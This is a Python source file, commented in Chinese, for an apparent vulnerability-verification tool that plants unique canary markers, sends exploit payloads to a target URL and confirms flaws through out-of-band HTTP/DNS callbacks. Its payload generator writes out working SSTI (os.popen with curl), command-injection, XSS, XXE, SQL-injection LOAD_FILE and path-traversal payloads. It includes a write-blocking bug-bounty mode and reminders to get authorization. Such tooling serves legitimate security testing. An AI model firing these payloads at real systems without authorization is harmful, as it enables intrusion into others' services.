#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Canary — 预埋唯一标记 → 确定性验证（XBOW's core innovation）。

核心逻辑:
  1. Plant: 在目标环境预埋一个唯一 canary（OOB/FILE/DB/JWT/SSH）
  2. Trigger: 发送漏洞利用请求，期望读取/触发到 canary
  3. Verify: 检查响应是否包含 canary → 确定无疑地证明漏洞存在

场景适配:
  - 🎯 黑盒挖洞 (Bug Bounty): 使用 OOB canary（DNS/HTTP 回调）
  - 🏗️ 授权测试 (Pentest): 使用 FILE/DB canary（写入文件/数据库）
  - 🔬 CTF/实验室: 使用所有 canary 类型
"""

from __future__ import annotations

import hashlib
import json
import os
import random
import re
import secrets
import socket
import subprocess
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Callable, Optional
from urllib.parse import urlparse, urlencode, parse_qs

# ── OOB ──────────────────────────────────────────────────────────────────────

_HAS_OOB = False
_OOBServer = None
try:
    from aimy.tools.oob_server import OOBServer as _OOBImpl
    _HAS_OOB = True
except ImportError:
    _OOBImpl = None  # type: ignore

_HAS_REQUESTS = False
try:
    import requests as _req
    _HAS_REQUESTS = True
except ImportError:
    _req = None  # type: ignore

_HAS_PLAYWRIGHT = False
try:
    from playwright.sync_api import sync_playwright
    _HAS_PLAYWRIGHT = True
except ImportError:
    pass


# ── 安全防线 ──────────────────────────────────────────────────────────────────

# ⚠️ 类型注解快速看:  fn(x: str) -> bool  的意思是"函数fn,参数x是字符串,返回是或否"
#                      list[str]           表示"字符串列表"
#                      dict[str, int]      表示"字典,键是字符串,值是数字"
#                      X | None            表示"可以是X类型,也可以是空"
#
# ⚠️ 中括号 [] 快速看: 可以理解成"字典/列表"的读写操作
#   d["key"] = "值"     → "在字典d里,key这一项写为'值'"
#   print(d["key"])     → "读出字典d里key这一项"
#   print(d.get("key")) → "安全读法,没有key就返回None不报错"
#   lst[0]              → "列表lst里第1项"
#
#                     看不懂括号里的→只看"""中文说明"""就行,括号是给机器看的

_BB_MODE = True
"""挖洞模式锁: True=禁止任何写操作, False=授权测试模式可写入"""


def set_mode(bb_mode: bool):
    # 切换挖洞/授权模式。挖洞模式禁止写文件/数据库。授权测试模式解锁全部功能。
    global _BB_MODE
    _BB_MODE = bb_mode


def _assert_write_allowed(op_name: str):
    # 检查当前是否挖洞模式,是的话就报错不让写,防止违规
    if _BB_MODE:
        raise PermissionError(
            f"[SECURITY] 挖洞模式禁止写操作: {op_name}\n"
            f"  原因: 向目标系统写入数据违反 SRC/H1/BC 规则。\n"
            f"  如需写入: ① 确认有书面授权 ② 调用 canary.set_mode(bb_mode=False)"
        )


# =========================================================================
#  Canary 核心
# =========================================================================

# 全局 canary 注册表
_canary_registry: dict[str, dict] = {}
_registry_lock = threading.Lock()


def _new_id() -> str:
    # 生成一个不会重复的ID,格式: CNR_后面跟16位随机字符
    return f"CNR_{uuid.uuid4().hex[:16]}"


class Canary:
    """一个 canary = 预埋的唯一标记 + 验证方法。

    属性:
      id:       全局唯一标识
      value:    canary 的具体值（UUID, 文件名, 域名等）
      type:     oob_http | oob_dns | file | db | jwt | ssh
      planted:  是否已预埋
      hit:      验证时是否命中
      created:  创建时间
      meta:     自定义元数据
    """

    def __init__(self, canary_type: str, value: str = "", meta: dict | None = None):
        # canaty_type: 类型(oob_http/oob_dns/file/db/jwt)
        # value:       预埋的值(URL/域名/文件名/token等)
        # meta:        附加信息字典
        self.id = _new_id()
        self.type = canary_type
        self.value = value or self.id
        self.planted = False
        self.hit = False
        self.hit_evidence: list[str] = []
        self.created = datetime.now().isoformat()
        self.meta = meta or {}

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "type": self.type,
            "value": self.value,
            "planted": self.planted,
            "hit": self.hit,
            "evidence": self.hit_evidence,
            "created": self.created,
            "meta": self.meta,
        }

    def __repr__(self):
        return f"<Canary {self.id[:12]} type={self.type} hit={self.hit}>"


# =========================================================================
#  Canary 工厂 — 生产各种 canary
# =========================================================================


class CanaryFactory:
    """生产不同类型的 canary。

    每个 plant_* 方法:
      1. 创建 Canary 对象
      2. 在目标环境预埋标记
      3. 注册到全局注册表
      4. 返回 Canary
    """

    @staticmethod
    def plant_oob_http(timeout: float = 30.0) -> Canary:
        # 注册一个HTTP回调URL。挖洞时如果目标访问了这个URL就说明漏洞存在。
        # 适用于: SSRF / XXE / RCE / SSTI — 任何能让目标发HTTP请求的漏洞
        canary = Canary("oob_http")
        if _HAS_OOB and _OOBImpl:
            srv = _OOBImpl.get_instance()
            if not srv._running:
                srv.start()
            cb_url = srv.register_callback_id(canary.id)
            canary.value = cb_url
            canary.meta["timeout"] = timeout
        else:
            # Fallback: 无 OOB 服务器时用占位
            canary.value = f"http://oob.local/cb/{canary.id}"
            canary.meta["fake"] = True

        canary.planted = True
        _canary_registry[canary.id] = canary
        return canary

    @staticmethod
    def plant_oob_dns(timeout: float = 30.0) -> Canary:
        # 注册一个DNS域名。挖洞时如果目标解析了这个域名就说明漏洞存在。
        # 适用于: SQLi(LOAD_FILE) / RCE(ping/nslookup) / XXE
        canary = Canary("oob_dns")
        if _HAS_OOB and _OOBImpl:
            srv = _OOBImpl.get_instance()
            if not srv._running:
                srv.start()
            srv.register_callback_id(canary.id)
            # DNS 域名 = {id}.oob
            canary.value = f"{canary.id}.oob"
            canary.meta["timeout"] = timeout
        else:
            canary.value = f"{canary.id}.oob.local"
            canary.meta["fake"] = True

        canary.planted = True
        _canary_registry[canary.id] = canary
        return canary

    @staticmethod
    def plant_file(path: str = "") -> Canary:
        # [红线⚠️] 往服务器写文件,只适用于有书面授权的渗透测试
        # 挖洞时调这个会报错,因为往目标服务器写东西是违规的
        canary = Canary("file")
        canary.value = f"CANARY_{uuid.uuid4().hex[:16]}"
        _assert_write_allowed(f"plant_file({path})")

        path = path or f"/tmp/{canary.id}.txt"
        try:
            Path(path).write_text(canary.value, encoding="utf-8")
            canary.planted = True
            canary.meta["path"] = path
        except (OSError, PermissionError) as e:
            canary.meta["error"] = str(e)
            canary.planted = False

        _canary_registry[canary.id] = canary
        return canary

    @staticmethod
    def plant_db(table: str = "", column: str = "", where: str = "") -> Canary:
        """DB canary: 在数据库插入唯一记录。

        原理: 插入一条包含唯一 UUID 的数据记录。
              如果 SQLi 能查询到这条记录 → 确定无疑地证明了 SQL 注入。
        适用: SQLi (授权渗透测试时使用)

        注意: 需要数据库写权限，仅授权测试可用。
        """
        canary = Canary("db")
        canary.value = f"CNR_{uuid.uuid4().hex[:16]}"
        _assert_write_allowed(f"plant_db({table})")
        canary.meta["table"] = table
        canary.meta["column"] = column
        canary.meta["where"] = where

        # SQL 模板 (需要外部执行)
        sql = f"INSERT INTO {table or 'canary_test'} ({column or 'canary_value'}) "
        sql += f"VALUES ('{canary.value}')"
        if where:
            sql += f" WHERE {where}"
        canary.meta["sql"] = sql
        canary.meta["pending_manual"] = True  # 需要人工执行 SQL

        _canary_registry[canary.id] = canary
        return canary

    @staticmethod
    def plant_jwt(secret: str = "") -> Canary:
        # 用已知密钥签发一个JWT。如果网站接受它当登录凭证,说明JWT签名验证有漏洞
        import hmac
        import base64

        canary = Canary("jwt")
        secret = secret or "canary_secret_2026"

        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()

        payload_data = {
            "sub": "canary_validator",
            "iat": int(time.time()),
            "canary": canary.id,
        }
        payload = base64.urlsafe_b64encode(
            json.dumps(payload_data).encode()
        ).rstrip(b"=").decode()

        sig = hmac.new(
            secret.encode(),
            f"{header}.{payload}".encode(),
            hashlib.sha256,
        ).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

        canary.value = f"{header}.{payload}.{sig_b64}"
        canary.meta["secret"] = secret
        canary.planted = True

        _canary_registry[canary.id] = canary
        return canary


# =========================================================================
#  Canary 验证器 — 检查 canary 是否被命中
# =========================================================================


class CanaryVerifier:
    """验证 canary 是否被触发/读取到。

    每个 check_* 方法返回 (hit: bool, evidence: list[str])。
    """

    @staticmethod
    def check_oob(canary: Canary, timeout: float = 0) -> tuple[bool, list[str]]:
        """检查 OOB canary 是否有回调。

        对于 oob_http: 检查 HTTP callback 是否收到
        对于 oob_dns:  检查 DNS 查询是否收到
        """
        timeout = timeout or canary.meta.get("timeout", 8.0)

        if canary.meta.get("fake"):
            return False, ["OOB server not available — cannot verify"]

        if not _HAS_OOB or not _OOBImpl:
            return False, ["OOB server not initialized"]

        srv = _OOBImpl.get_instance()

        # 等待回调
        deadline = time.time() + timeout
        all_cbs = []
        while time.time() < deadline:
            cbs = srv.pop_callbacks(canary.id)
            if cbs:
                all_cbs.extend(cbs)
                canary.hit = True
                for cb in cbs:
                    ev = f"OOB callback: {cb.path} from {cb.client}"
                    canary.hit_evidence.append(ev)
                return True, canary.hit_evidence
            time.sleep(0.3)

        return False, [f"No OOB callback within {timeout}s"]

    @staticmethod
    def check_response(canary: Canary, response_text: str) -> tuple[bool, list[str]]:
        # 看服务器返回的内容里有没有包含我们预埋的标记
        # 有→漏洞确定存在; 没有→不确定
        if canary.value in response_text:
            canary.hit = True
            ev = f"Canary value '{canary.value[:24]}...' found in response ({len(response_text)} bytes)"
            canary.hit_evidence.append(ev)
            return True, [ev]

        # 也检查编码后的版本
        encoded = canary.value.replace("<", "&lt;").replace(">", "&gt;")
        if encoded != canary.value and encoded in response_text:
            canary.hit = True
            ev = f"Canary value found HTML-encoded in response"
            canary.hit_evidence.append(ev)
            return True, [ev]

        return False, ["Canary value not found in response"]

    @staticmethod
    def check_file(canary: Canary) -> tuple[bool, list[str]]:
        """检查文件 canary 是否仍存在/已被读取。"""
        path = canary.meta.get("path", "")
        if not path or not os.path.exists(path):
            return False, ["Canary file not found"]
        content = Path(path).read_text(encoding="utf-8", errors="ignore")
        if canary.value in content:
            # 文件还在说明没有被利用读取过 → 但 canary 本身存在说明预埋成功
            canary.planted = True
            return False, ["Canary file exists but not accessed (file still intact)"]
        return False, ["Canary value mismatch"]

    @staticmethod
    def check_db(canary: Canary, query_result: str) -> tuple[bool, list[str]]:
        """检查 DB canary 是否在查询结果中。"""
        return CanaryVerifier.check_response(canary, query_result)


# =========================================================================
#  Canary 管线 — 一键：预埋 → 攻击 → 验证
# =========================================================================


class CanaryPipeline:
    """完整的 canary 验证管线。

    用法:
        pipe = CanaryPipeline()

        # Step 1: 预埋 canary
        canary = pipe.plant("ssrf")

        # Step 2: 发送漏洞利用（手动或自动）
        resp = requests.get(f"http://target.com/fetch?url={canary.value}")

        # Step 3: 验证 canary
        result = pipe.verify(canary)
        if result["confirmed"]:
            print("SSRF confirmed!")
    """

    # 漏洞类 → 推荐的 canary 类型
    CANARY_MAP: dict[str, list[str]] = {
        "ssrf":               ["oob_http", "oob_dns", "cloud_metadata"],
        "sqli":               ["oob_dns", "time_based"],
        "xss":                ["oob_http", "http_reflection"],
        "xxe":                ["oob_http", "oob_dns", "file_read"],
        "ssti":               ["oob_http", "math_test"],
        "cmdi":               ["oob_dns", "oob_http", "time_based"],
        "rce":                ["oob_dns", "oob_http", "time_based"],
        "lfi":                ["file_read", "php_wrapper"],
        "path traversal":     ["file_read"],
        "file upload":        ["file_read"],
        "graphql":            ["introspection"],
        "jwt":                ["alg_none", "jwt_canary"],
        "smuggling":          ["cl_te", "te_cl"],
        "open redirect":      ["header_check"],
        "cors":               ["origin_reflection"],
        "idor":               ["cross_session"],
        "race condition":     ["parallel_race"],
        "csrf":               ["token_missing"],
        "subdomain takeover": ["dns_resolve"],
        "crlf":               ["response_split"],
        "cache poisoning":    ["cache_key"],
        "prototype pollution": ["key_injection"],
        "nosqli":             ["time_based"],
        "business logic":     ["state_replay"],
        "auth bypass":        ["token_reuse"],
        "account takeover":   ["token_reuse"],
    }

    def __init__(self):
        self._injections: dict[str, str] = {}
        """漏洞类型 → 用于 inject 的 payload 模板"""

    # ── 预埋 ───────────────────────────────────────────────────────

    def plant(self, vuln_class: str, **kwargs) -> Canary:
        """按漏洞类型选择最优 canary 并预埋。

        自动选择最合适的 canary 类型:
          - 能 OOB 的尽量用 OOB（黑盒通用）
          - 需写文件/数据库的 fallback
        """
        vc = vuln_class.lower().strip()

        if vc in ("ssrf", "xxe", "ssti", "rce", "cmdi"):
            # 优先 OOB HTTP（确认度高）
            return CanaryFactory.plant_oob_http(**kwargs)

        if vc in ("sqli", "nosqli", "cmdi"):
            # SQLi 优先 OOB DNS（LOAD_FILE 常见）
            return CanaryFactory.plant_oob_dns(**kwargs)

        if vc == "lfi" or "path" in vc or "file" in vc:
            return CanaryFactory.plant_file(**kwargs)

        if vc == "jwt":
            return CanaryFactory.plant_jwt(**kwargs)

        # 默认: OOB HTTP
        return CanaryFactory.plant_oob_http(**kwargs)

    # ── 生成注入 payload ──────────────────────────────────────────

    def payload_for(self, canary: Canary, vuln_class: str = "") -> str:
        """生成包含 canary 的漏洞利用 payload。"""
        vc = vuln_class.lower().strip() if vuln_class else ""

        if canary.type == "oob_http":
            oob_url = canary.value
            if vc == "ssrf":
                return oob_url
            elif vc == "xxe":
                return f'<!ENTITY xxe SYSTEM "{oob_url}">]>&xxe;'
            elif vc == "ssti":
                return f"{{{{config.__class__.__init__.__globals__['os'].popen('curl {oob_url}').read()}}}}"
            elif vc == "cmdi" or vc == "rce":
                return f"; curl {oob_url} || ping -c 1 {oob_url.split('/')[-1]}"
            elif vc == "xss":
                return f'<img src="{oob_url}" onerror="fetch(\'{oob_url}\')">'
            else:
                return oob_url

        elif canary.type == "oob_dns":
            domain = canary.value
            if vc == "sqli":
                return f"1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\{domain}\\\\test'))-- -"
            elif vc == "cmdi" or vc == "rce":
                return f"; nslookup {domain} || ping {domain}"
            elif vc == "xxe":
                return f'<!ENTITY xxe SYSTEM "http://{domain}/">]>&xxe;'
            else:
                return domain

        elif canary.type == "file":
            path = canary.meta.get("path", f"/tmp/{canary.id}.txt")
            if vc == "lfi" or "path" in vc:
                return f"../../../../../../..{path}"
            return path

        elif canary.type == "jwt":
            return canary.value

        # fallback
        return canary.value

    # ── 验证 ───────────────────────────────────────────────────────

    def verify(
        self,
        canary: Canary,
        response_text: str = "",
        timeout: float = 0,
    ) -> dict:
        """验证 canary 是否命中。返回完整的验证结果。

        返回:
          confirmed: bool  — 是否确定无疑
          evidence:  list  — 证据
          canary_id: str   — canary ID
          type:      str   — canary 类型
          value:     str   — canary 值
        """
        result = {
            "confirmed": False,
            "evidence": [],
            "canary_id": canary.id,
            "type": canary.type,
            "value": canary.value,
            "ts": datetime.now().isoformat(),
        }

        if canary.type in ("oob_http", "oob_dns"):
            hit, ev = CanaryVerifier.check_oob(canary, timeout=timeout)

        elif canary.type == "file":
            if response_text:
                hit, ev = CanaryVerifier.check_response(canary, response_text)
            else:
                hit, ev = CanaryVerifier.check_file(canary)

        elif canary.type == "db":
            hit, ev = CanaryVerifier.check_response(canary, response_text)

        elif canary.type == "jwt":
            hit, ev = CanaryVerifier.check_response(canary, response_text)

        else:
            if response_text:
                hit, ev = CanaryVerifier.check_response(canary, response_text)
            else:
                hit, ev = False, ["No verification method for this canary type"]

        result["confirmed"] = hit
        result["evidence"] = ev

        if hit:
            result["evidence"].append(
                f"Canary {canary.id[:12]} ({canary.type}) — DETERMINISTIC CONFIRMATION"
            )

        return result


# =========================================================================
#  集成: Validator + Canary 联合验证
# =========================================================================


def validate_with_canary(
    vuln_class: str,
    url: str = "",
    param: str = "",
    payload: str = "",
    **kwargs,
) -> dict:
    """高级验证: 先用 Validator 逻辑验证 + Canary OOB 双重确认。

    返回:
      verdict:    confirmed | rejected | needs_human
      confidence: 0.0-1.0
      validator:  Validator 的验证结果
      canary:     Canary 验证结果（OOB callback 等）
    """
    result = {
        "verdict": "rejected",
        "confidence": 0.0,
        "evidence": [],
        "validator": None,
        "canary": None,
    }

    # 1. 预埋 canary
    pipe = CanaryPipeline()
    canary = pipe.plant(vuln_class)
    canary_payload = pipe.payload_for(canary, vuln_class)

    # 2. 跑 Validator 验证
    from aimy.tools.validator import Validator
    v = Validator(verbose=False)
    v_result = v.validate(
        vuln_class=vuln_class,
        url=url,
        param=param,
        payload=payload or canary_payload,
        **kwargs,
    )
    result["validator"] = v_result.to_dict()
    result["evidence"].extend(v_result.evidence)

    # 3. 如果 Validator 已经 confirmed → 再等 canary OOB 确认
    if v_result.verdict == "confirmed":
        # 用 canary payload 再发一次（如果 Validator 没有用 canary payload）
        if canary.type in ("oob_http", "oob_dns") and _HAS_OOB:
            if payload != canary_payload and url:
                try:
                    from urllib.parse import urlencode, urlparse, parse_qs
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    if param:
                        qs[param] = [canary_payload]
                    new_qs = urlencode(qs, doseq=True)
                    from urllib.parse import ParseResult
                    canary_url = ParseResult(
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_qs, parsed.filename
                    ).geturl()
                    _req.get(canary_url, timeout=10, allow_redirects=False)
                except Exception:
                    pass

        # 等待 OOB callback
        canary_result = pipe.verify(canary, timeout=8.0)
        result["canary"] = canary_result
        result["evidence"].extend(canary_result["evidence"])

        if canary_result["confirmed"]:
            result["verdict"] = "confirmed"
            result["confidence"] = 0.98
            result["evidence"].append(
                "🔒 DETERMINISTIC CONFIRMATION: Canary + Validator both confirmed"
            )
        else:
            # Validator 说 confirmed 但 canary 未回调 → downgrade
            result["verdict"] = "downgraded"
            result["confidence"] = 0.6
            result["evidence"].append(
                "⚠️ Validator confirmed but no canary callback — possible false positive"
            )
    else:
        result["verdict"] = v_result.verdict
        result["confidence"] = v_result.confidence

    return result


# =========================================================================
#  CLI
# =========================================================================


def _cli():
    import argparse
    ap = argparse.ArgumentParser(description="Canary — 确定性漏洞验证系统")
    ap.add_argument("--vuln", default="", help="漏洞类")
    ap.add_argument("--url", default="", help="目标 URL")
    ap.add_argument("--param", default="", help="参数名")
    ap.add_argument("--payload", default="", help="自定义 payload")
    ap.add_argument("--mode", choices=["bb", "pentest"], default="bb",
                    help="bb=挖洞模式(默认,禁止写操作), pentest=授权测试模式(解锁全部功能)")
    ap.add_argument("--list", action="store_true", help="列出支持的漏洞类")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    # 先设置模式
    if args.mode == "pentest":
        set_mode(bb_mode=False)
        print("[!] 已切换到授权测试模式 — 写操作已解锁")
        print("[!] 确认你有书面授权后再使用 file/db canary")

    if args.list:
        print("支持的漏洞类:")
        for vc in sorted(CanaryPipeline.CANARY_MAP.keys()):
            ctypes = CanaryPipeline.CANARY_MAP[vc]
            print(f"  {vc:25s} → {', '.join(ctypes)}")
        return

    if not args.vuln:
        ap.print_help()
        return

    # 完整验证
    result = validate_with_canary(
        vuln_class=args.vuln,
        url=args.url,
        param=args.param,
        payload=args.payload,
    )
    print(json.dumps(result, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    _cli()
